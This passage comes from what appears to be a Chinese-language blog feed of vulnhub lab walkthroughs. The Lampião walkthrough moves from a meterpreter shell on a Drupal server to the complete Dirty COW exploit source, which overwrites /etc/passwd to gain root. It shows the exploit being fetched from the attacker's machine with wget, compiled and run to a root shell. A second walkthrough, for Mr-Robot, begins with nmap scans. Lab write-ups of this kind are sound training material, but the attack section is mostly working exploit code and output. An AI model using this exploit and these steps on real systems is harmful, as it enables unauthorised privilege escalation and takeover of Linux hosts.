-0400  index.php</span><br><span class="line">100755/rwxr-xr-x  703      fil   2018-04-19 15:39:33 -0400  install.php</span><br><span class="line">100755/rwxr-xr-x  267732   fil   2015-08-03 22:51:40 -0400  lampiao.jpg</span><br><span class="line">40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  misc</span><br><span class="line">40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  modules</span><br><span class="line">40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  profiles</span><br><span class="line">100644/rw-r--r--  9674     fil   2018-04-20 12:48:37 -0400  qrc.png</span><br><span class="line">100755/rwxr-xr-x  2189     fil   2018-04-19 15:39:33 -0400  robots.txt</span><br><span class="line">40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  scripts</span><br><span class="line">40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  sites</span><br><span class="line">40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  themes</span><br><span class="line">100755/rwxr-xr-x  19986    fil   2018-04-19 15:39:33 -0400  update.php</span><br><span class="line">100755/rwxr-xr-x  2200     fil   2018-04-19 15:39:33 -0400  web.config</span><br><span class="line">100755/rwxr-xr-x  417      fil   2018-04-19 15:39:33 -0400  xmlrpc.php</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 4649 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/var/www/html</span><br></pre></td></tr></table></figure>

<p>现在已经有了meterpreter，因此考虑使用以下命令检查有关受害者机器的描述：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@lampiao:/var/www/html$ lsb_release -a</span><br><span class="line">lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 14.04.5 LTS</span><br><span class="line">Release:        14.04</span><br><span class="line">Codename:       trusty</span><br></pre></td></tr></table></figure>

<p>该说明从“受害者机器的版本号”中提供了非常有力的暗示，供下一步使用。</p>
<p>在使用较早的有关版本号的线索进行长时间搜索之后，终于找到了所需的漏洞，并将其下载到了计算机上。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDA4NDc=">Linux内核2.6.22-3.9-Dirty-COW-/proc/self/mem-竞争条件提权-/etc/passwd方法<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>即脏牛提权</p>
<p>40847.cpp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// EDB-Note: Compile:   g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">// EDB-Note: Recommended way to run:   ./dcow -s    (Will automatically <span class="keyword">do</span> <span class="string">&quot;echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs&quot;</span>)</span><br><span class="line">//</span><br><span class="line">// -----------------------------------------------------------------</span><br><span class="line">// Copyright (C) 2016  Gabriele Bonacini</span><br><span class="line">//</span><br><span class="line">// This program is free software; you can redistribute it and/or modify</span><br><span class="line">// it under the terms of the GNU General Public License as published by</span><br><span class="line">// the Free Software Foundation; either version 3 of the License, or</span><br><span class="line">// (at your option) any later version.</span><br><span class="line">// This program is distributed <span class="keyword">in</span> the hope that it will be useful,</span><br><span class="line">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="line">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="line">// GNU General Public License <span class="keyword">for</span> more details.</span><br><span class="line">// You should have received a copy of the GNU General Public License</span><br><span class="line">// along with this program; <span class="keyword">if</span> not, write to the Free Software Foundation,</span><br><span class="line">// Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA</span><br><span class="line">// -----------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fstream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string&gt;</span></span><br><span class="line"><span class="comment">#include &lt;thread&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;pwd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;pty.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;termios.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/wait.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;signal.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define  BUFFSIZE    1024</span></span><br><span class="line"><span class="comment">#define  PWDFILE     &quot;/etc/passwd&quot;</span></span><br><span class="line"><span class="comment">#define  BAKFILE     &quot;./.ssh_bak&quot;</span></span><br><span class="line"><span class="comment">#define  TMPBAKFILE  &quot;/tmp/.ssh_bak&quot;</span></span><br><span class="line"><span class="comment">#define  PSM         &quot;/proc/self/mem&quot;</span></span><br><span class="line"><span class="comment">#define  ROOTID      &quot;root:&quot;</span></span><br><span class="line"><span class="comment">#define  SSHDID      &quot;sshd:&quot;</span></span><br><span class="line"><span class="comment">#define  MAXITER     300</span></span><br><span class="line"><span class="comment">#define  DEFPWD      &quot;$6$P7xBAooQEZX/ham$9L7U0KJoihNgQakyfOQokDgQWLSTFZGB9LUU7T0W2kH1rtJXTzt9mG4qOoz9Njt.tIklLtLosiaeCBsZm8hND/&quot;</span></span><br><span class="line"><span class="comment">#define  TXTPWD      &quot;dirtyCowFun\n&quot;</span></span><br><span class="line"><span class="comment">#define  DISABLEWB   &quot;echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs\n&quot;</span></span><br><span class="line"><span class="comment">#define  EXITCMD     &quot;exit\n&quot;</span></span><br><span class="line"><span class="comment">#define  CPCMD       &quot;cp &quot;</span></span><br><span class="line"><span class="comment">#define  RMCMD       &quot;rm &quot;</span></span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">class Dcow&#123;</span><br><span class="line">    private:</span><br><span class="line">       bool              run,        rawMode,     opShell,   restPwd;</span><br><span class="line">       void              *map;</span><br><span class="line">       int               fd,         iter,        master,    wstat;</span><br><span class="line">       string            buffer,     etcPwd,      etcPwdBak,</span><br><span class="line">                         root,       user,        <span class="built_in">pwd</span>,       sshd;</span><br><span class="line">       thread            *writerThr, *madviseThr, *checkerThr;</span><br><span class="line">       ifstream          *extPwd;</span><br><span class="line">       ofstream          *extPwdBak;</span><br><span class="line">       struct passwd     *userId;</span><br><span class="line">       pid_t             child;  </span><br><span class="line">       char              buffv[BUFFSIZE];</span><br><span class="line">       fd_set            rfds;</span><br><span class="line">       struct termios    termOld,    termNew;</span><br><span class="line">       ssize_t           ign;</span><br><span class="line"></span><br><span class="line">       void exitOnError(string msg);</span><br><span class="line">    public:</span><br><span class="line">       Dcow(bool opSh, bool rstPwd);</span><br><span class="line">       ~Dcow(void);</span><br><span class="line">       int  expl(void);         </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Dcow::Dcow(bool opSh, bool rstPwd) : run(<span class="literal">true</span>), rawMode(<span class="literal">false</span>), opShell(opSh), restPwd(rstPwd),</span><br><span class="line">                   iter(0), wstat(0), root(ROOTID), <span class="built_in">pwd</span>(DEFPWD), sshd(SSHDID), writerThr(nullptr),</span><br><span class="line">                   madviseThr(nullptr), checkerThr(nullptr), extPwd(nullptr), extPwdBak(nullptr), </span><br><span class="line">                   child(0)&#123; </span><br><span class="line">   userId = getpwuid(getuid());</span><br><span class="line">   user.append(userId-&gt;pw_name).append(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">   extPwd = new ifstream(PWDFILE);   </span><br><span class="line">   <span class="keyword">while</span> (getline(*extPwd, buffer))&#123;</span><br><span class="line">       buffer.append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">       etcPwdBak.append(buffer);</span><br><span class="line">       <span class="keyword">if</span>(buffer.find(root) == 0)&#123;</span><br><span class="line">          etcPwd.insert(0, root).insert(root.size(), <span class="built_in">pwd</span>);</span><br><span class="line">          etcPwd.insert(etcPwd.begin() + root.size() + pwd.size(), </span><br><span class="line">                        buffer.begin() + buffer.find(<span class="string">&quot;:&quot;</span>, root.size()), buffer.end());</span><br><span class="line">       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(buffer.find(user) == 0 ||  buffer.find(sshd) == 0 )&#123;</span><br><span class="line">          etcPwd.insert(0, buffer);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          etcPwd.append(buffer);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   extPwdBak = new ofstream(restPwd ? TMPBAKFILE : BAKFILE);</span><br><span class="line">   extPwdBak-&gt;write(etcPwdBak.c_str(), etcPwdBak.size());</span><br><span class="line">   extPwdBak-&gt;close();</span><br><span class="line">   fd = open(PWDFILE,O_RDONLY);</span><br><span class="line">   map = mmap(nullptr, etcPwdBak.size(), PROT_READ,MAP_PRIVATE, fd, 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Dcow::~Dcow(void)&#123;</span><br><span class="line">   extPwd-&gt;close();</span><br><span class="line">   close(fd);</span><br><span class="line">   delete extPwd; delete extPwdBak; delete madviseThr; delete writerThr; delete checkerThr;</span><br><span class="line">   <span class="keyword">if</span>(rawMode)    tcsetattr(STDIN_FILENO, TCSANOW, &amp;termOld);</span><br><span class="line">   <span class="keyword">if</span>(child != 0) <span class="built_in">wait</span>(&amp;wstat); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Dcow::exitOnError(string msg)&#123;</span><br><span class="line">      cerr &lt;&lt; msg &lt;&lt; endl;</span><br><span class="line">      // <span class="keyword">if</span>(child != 0) <span class="built_in">kill</span>(child, SIGKILL);</span><br><span class="line">      throw new exception();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int  Dcow::expl(void)&#123;</span><br><span class="line">   madviseThr = new thread([&amp;]()&#123; <span class="keyword">while</span>(run)&#123; madvise(map, etcPwdBak.size(), MADV_DONTNEED);&#125; &#125;);</span><br><span class="line">   writerThr  = new thread([&amp;]()&#123; int fpsm = open(PSM,O_RDWR);  </span><br><span class="line">                                  <span class="keyword">while</span>(run)&#123; lseek(fpsm, reinterpret_cast&lt;off_t&gt;(map), SEEK_SET); </span><br><span class="line">                                              ign = write(fpsm, etcPwd.c_str(), etcPwdBak.size()); &#125;</span><br><span class="line">                                &#125;);</span><br><span class="line">   checkerThr = new thread([&amp;]()&#123; <span class="keyword">while</span>(iter &lt;= MAXITER)&#123; </span><br><span class="line">                                         extPwd-&gt;clear(); extPwd-&gt;seekg(0, ios::beg); </span><br><span class="line">                                         buffer.assign(istreambuf_iterator&lt;char&gt;(*extPwd),</span><br><span class="line">                                                       istreambuf_iterator&lt;char&gt;());</span><br><span class="line">                                         <span class="keyword">if</span>(buffer.find(<span class="built_in">pwd</span>) != string::npos &amp;&amp; </span><br><span class="line">                                            buffer.size() &gt;= etcPwdBak.size())&#123;</span><br><span class="line">                                                run = <span class="literal">false</span>; <span class="built_in">break</span>;</span><br><span class="line">                                         &#125;</span><br><span class="line">                                         iter ++; usleep(300000);</span><br><span class="line">                                   &#125;</span><br><span class="line">                                   run = <span class="literal">false</span>;</span><br><span class="line">                                 &#125;);</span><br><span class="line"></span><br><span class="line">  cerr &lt;&lt; <span class="string">&quot;Running ...&quot;</span> &lt;&lt; endl;</span><br><span class="line">  madviseThr-&gt;join();</span><br><span class="line">  writerThr-&gt;join();</span><br><span class="line">  checkerThr-&gt;join();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(iter &lt;= MAXITER)&#123; </span><br><span class="line">       child = forkpty(&amp;master, nullptr, nullptr, nullptr);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(child == -1) exitOnError(<span class="string">&quot;Error forking pty.&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(child == 0)&#123; </span><br><span class="line">          execlp(<span class="string">&quot;su&quot;</span>, <span class="string">&quot;su&quot;</span>, <span class="string">&quot;-&quot;</span>, nullptr);</span><br><span class="line">          exitOnError(<span class="string">&quot;Error on exec.&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(opShell) cerr &lt;&lt; <span class="string">&quot;Password overridden to: &quot;</span> &lt;&lt;  TXTPWD &lt;&lt; endl;</span><br><span class="line">       memset(buffv, 0, BUFFSIZE);</span><br><span class="line">       ssize_t bytes_read = <span class="built_in">read</span>(master, buffv, BUFFSIZE - 1);</span><br><span class="line">       <span class="keyword">if</span>(bytes_read &lt;= 0) exitOnError(<span class="string">&quot;Error reading  su prompt.&quot;</span>);</span><br><span class="line">       cerr &lt;&lt; <span class="string">&quot;Received su prompt (&quot;</span> &lt;&lt; buffv &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; endl; </span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(write(master, TXTPWD, strlen(TXTPWD)) &lt;= 0) </span><br><span class="line">            exitOnError(<span class="string">&quot;Error writing pwd on tty.&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(write(master, DISABLEWB, strlen(DISABLEWB)) &lt;= 0) </span><br><span class="line">            exitOnError(<span class="string">&quot;Error writing cmd on tty.&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(!opShell)&#123;</span><br><span class="line">            <span class="keyword">if</span>(write(master, EXITCMD, strlen(EXITCMD)) &lt;= 0) </span><br><span class="line">                 exitOnError(<span class="string">&quot;Error writing exit cmd on tty.&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">if</span>(restPwd)&#123;</span><br><span class="line">               string restoreCmd = string(CPCMD).append(TMPBAKFILE).append(<span class="string">&quot; &quot;</span>).append(PWDFILE).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(write(master, restoreCmd.c_str(), restoreCmd.size()) &lt;= 0) </span><br><span class="line">                    exitOnError(<span class="string">&quot;Error writing restore cmd on tty.&quot;</span>);</span><br><span class="line">               restoreCmd        = string(RMCMD).append(TMPBAKFILE).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(write(master, restoreCmd.c_str(), restoreCmd.size()) &lt;= 0) </span><br><span class="line">                    exitOnError(<span class="string">&quot;Error writing restore cmd (rm) on tty.&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span>(tcgetattr(STDIN_FILENO, &amp;termOld) == -1 )</span><br><span class="line">                exitOnError(<span class="string">&quot;Error getting terminal attributes.&quot;</span>);</span><br><span class="line">    </span><br><span class="line">           termNew               = termOld;</span><br><span class="line">           termNew.c_lflag       &amp;= static_cast&lt;unsigned long&gt;(~(ICANON | ECHO));</span><br><span class="line">    </span><br><span class="line">           <span class="keyword">if</span>(tcsetattr(STDIN_FILENO, TCSANOW, &amp;termNew) == -1)</span><br><span class="line">                exitOnError(<span class="string">&quot;Error setting terminal in non-canonical mode.&quot;</span>);</span><br><span class="line">           rawMode = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">           <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">                FD_ZERO(&amp;rfds);</span><br><span class="line">                FD_SET(master, &amp;rfds);</span><br><span class="line">                FD_SET(STDIN_FILENO, &amp;rfds);</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span>(select(master + 1, &amp;rfds, nullptr, nullptr, nullptr) &lt; 0 )</span><br><span class="line">                    exitOnError(<span class="string">&quot;Error on select tty.&quot;</span>);</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span>(FD_ISSET(master, &amp;rfds)) &#123;</span><br><span class="line">                    memset(buffv, 0, BUFFSIZE);</span><br><span class="line">                    bytes_read = <span class="built_in">read</span>(master, buffv, BUFFSIZE - 1);</span><br><span class="line">                    <span class="keyword">if</span>(bytes_read &lt;= 0) <span class="built_in">break</span>;</span><br><span class="line">                    <span class="keyword">if</span>(write(STDOUT_FILENO, buffv, bytes_read) != bytes_read)</span><br><span class="line">                          exitOnError(<span class="string">&quot;Error writing on stdout.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span>(FD_ISSET(STDIN_FILENO, &amp;rfds)) &#123;</span><br><span class="line">                    memset(buffv, 0, BUFFSIZE);</span><br><span class="line">                    bytes_read = <span class="built_in">read</span>(STDIN_FILENO, buffv, BUFFSIZE - 1);</span><br><span class="line">                    <span class="keyword">if</span>(bytes_read &lt;= 0) exitOnError(<span class="string">&quot;Error reading from stdin.&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span>(write(master, buffv, bytes_read) != bytes_read) <span class="built_in">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">return</span> [](int ret, bool shell)&#123; </span><br><span class="line">       string msg = shell ? <span class="string">&quot;Exit.\n&quot;</span> : string(<span class="string">&quot;Root password is:   &quot;</span>) + TXTPWD + <span class="string">&quot;Enjoy! :-)\n&quot;</span>;</span><br><span class="line">       <span class="keyword">if</span>(ret &lt;= MAXITER)&#123;cerr &lt;&lt; msg; <span class="built_in">return</span> 0;&#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;cerr &lt;&lt; <span class="string">&quot;Exploit failed.\n&quot;</span>; <span class="built_in">return</span> 1;&#125; </span><br><span class="line">  &#125;(iter, opShell);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void printInfo(char* cmd)&#123;</span><br><span class="line">      cerr &lt;&lt; cmd &lt;&lt; <span class="string">&quot; [-s] [-n] | [-h]\n&quot;</span> &lt;&lt; endl;</span><br><span class="line">      cerr &lt;&lt; <span class="string">&quot; -s  open directly a shell, if the exploit is successful;&quot;</span> &lt;&lt; endl;</span><br><span class="line">      cerr &lt;&lt; <span class="string">&quot; -n  combined with -s, doesn&#x27;t restore the passwd file.&quot;</span> &lt;&lt; endl;</span><br><span class="line">      cerr &lt;&lt; <span class="string">&quot; -h  print this synopsis;&quot;</span> &lt;&lt; endl;</span><br><span class="line">      cerr &lt;&lt; <span class="string">&quot;\n If no param is specified, the program modifies the passwd file and exits.&quot;</span> &lt;&lt; endl;</span><br><span class="line">      cerr &lt;&lt; <span class="string">&quot; A copy of the passwd file will be create in the current directory as .ssh_bak&quot;</span> &lt;&lt; endl;</span><br><span class="line">      cerr &lt;&lt; <span class="string">&quot; (unprivileged user), if no parameter or -n is specified.\n&quot;</span> &lt;&lt; endl;</span><br><span class="line">      <span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv)&#123;</span><br><span class="line">   const char  flags[]   = <span class="string">&quot;shn&quot;</span>;</span><br><span class="line">   int         c;</span><br><span class="line">   bool        opShell   = <span class="literal">false</span>,</span><br><span class="line">               restPwd   = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">   opterr = 0;</span><br><span class="line">   <span class="keyword">while</span> ((c = getopt(argc, argv, flags)) != -1)&#123;</span><br><span class="line">      switch (c)&#123;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            opShell = <span class="literal">true</span>;</span><br><span class="line">         <span class="built_in">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">            restPwd = <span class="literal">false</span>;</span><br><span class="line">         <span class="built_in">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">            printInfo(argv[0]);</span><br><span class="line">         <span class="built_in">break</span>;</span><br><span class="line">         default:</span><br><span class="line">            cerr &lt;&lt; <span class="string">&quot;Invalid parameter.&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">            printInfo(argv[0]);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!restPwd &amp;&amp; !opShell)&#123;</span><br><span class="line">            cerr &lt;&lt; <span class="string">&quot;Invalid parameter: -n requires -s&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">            printInfo(argv[0]);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   Dcow dcow(opShell, restPwd);</span><br><span class="line">   <span class="built_in">return</span> dcow.expl();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行一个python服务器，它将帮助通过Victim的计算机下载漏洞利用程序。</p>
<p>kali端执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/lampiao<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br><span class="line">192.168.66.1 - - [08/Apr/2020 01:48:23] code 404, message File not found</span><br><span class="line">192.168.66.1 - - [08/Apr/2020 01:48:23] <span class="string">&quot;GET /robots.txt HTTP/1.1&quot;</span> 404 -</span><br><span class="line">192.168.66.1 - - [08/Apr/2020 01:48:23] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.66.1 - - [08/Apr/2020 01:48:24] code 404, message File not found</span><br><span class="line">192.168.66.1 - - [08/Apr/2020 01:48:24] <span class="string">&quot;GET /favicon.ico HTTP/1.1&quot;</span> 404 -</span><br><span class="line">192.168.66.17 - - [08/Apr/2020 01:49:04] <span class="string">&quot;GET /40847.cpp HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p>受害者执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@lampiao:/var/www/html$ <span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">www-data@lampiao:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">www-data@lampiao:/tmp$ wget http://192.168.66.6:8000/40847.cpp</span><br><span class="line">wget http://192.168.66.6:8000/40847.cpp</span><br><span class="line">--2020-04-08 01:45:33--  http://192.168.66.6:8000/40847.cpp</span><br><span class="line">Connecting to 192.168.66.6:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 10531 (10K) [text/x-c++src]</span><br><span class="line">Saving to: <span class="string">&#x27;40847.cpp&#x27;</span></span><br><span class="line"></span><br><span class="line">100%[======================================&gt;] 10,531      --.-K/s   <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-04-08 01:45:33 (391 MB/s) - <span class="string">&#x27;40847.cpp&#x27;</span> saved [10531/10531]</span><br><span class="line"></span><br><span class="line">www-data@lampiao:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">40847.cpp</span><br></pre></td></tr></table></figure>

<p>现在已将此文件下载到服务器的/tmp（通用可写）目录中。由于该漏洞利用程序采用.cpp格式进行编译和执行，因此该漏洞利用程序代码中提供了特定的命令。这提供了有关如何编译和执行漏洞40847.ccp的提示。</p>
<p>现在有了root权限的shell！现在读取该flag。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@lampiao:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">40847.cpp</span><br><span class="line">www-data@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">&lt;-Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil            </span><br><span class="line">www-data@lampiao:/tmp$ ./dcow -s</span><br><span class="line">./dcow -s</span><br><span class="line">Running ...</span><br><span class="line">Password overridden to: dirtyCowFun</span><br><span class="line"></span><br><span class="line">Received su prompt (Password: )</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</span><br><span class="line">cp /tmp/.ssh_bak /etc/passwd</span><br><span class="line">rm /tmp/.ssh_bak</span><br><span class="line">root@lampiao:~<span class="comment"># echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</span></span><br><span class="line">root@lampiao:~<span class="comment"># cp /tmp/.ssh_bak /etc/passwd</span></span><br><span class="line">root@lampiao:~<span class="comment"># rm /tmp/.ssh_bak</span></span><br><span class="line">root@lampiao:~<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@lampiao:~<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@lampiao:~<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@lampiao:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">flag.txt</span><br><span class="line">root@lampiao:~<span class="comment"># cat flag.txt</span></span><br><span class="line">cat flag.txt</span><br><span class="line">9740616875908d91ddcdaa8aea3af366</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub241.jpg"></li>
</ul>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>msf drupal_drupalgeddon2漏洞利用</li>
<li>Linux内核2.6.22-3.9-Dirty-COW-/proc/self/mem-竞争条件提权-/etc/passwd方法（脏牛提权）</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Mr-Robot-1]</title>
    <url>/2020/01/02/Mr-Robot-1/</url>
    <content><![CDATA[<h3 id="发布日期"><a href="#发布日期" class="headerlink" title="发布日期"></a>发布日期</h3><p>姓名：Mr-Robot: 1<br>发布日期：2016年6月28日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9tcnJvYm90L21yUm9ib3Qub3Zh">https://download.vulnhub.com/mrrobot/mrRobot.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9tcnJvYm90L21yUm9ib3Qub3ZhLnRvcnJlbnQ=">https://download.vulnhub.com/mrrobot/mrRobot.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>根据表演，机器人先生。<br>此VM在不同位置有三个key。 您的目标是找到全部三个。 每个密钥逐渐难以找到。<br>VM不太困难。 没有任何高级开发或逆向工程。 该级别被认为是初学者-中级。</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.107</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 08:00:27:8D:B7:92 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -v -sV -Pn 192.168.56.107</span></span><br><span class="line">PORT    STATE  SERVICE  VERSION</span><br><span class="line">22/tcp  closed ssh</span><br><span class="line">80/tcp  open   http     Apache httpd</span><br><span class="line">443/tcp open   ssl/http Apache httpd</span><br></pre></td></tr></table></figure>

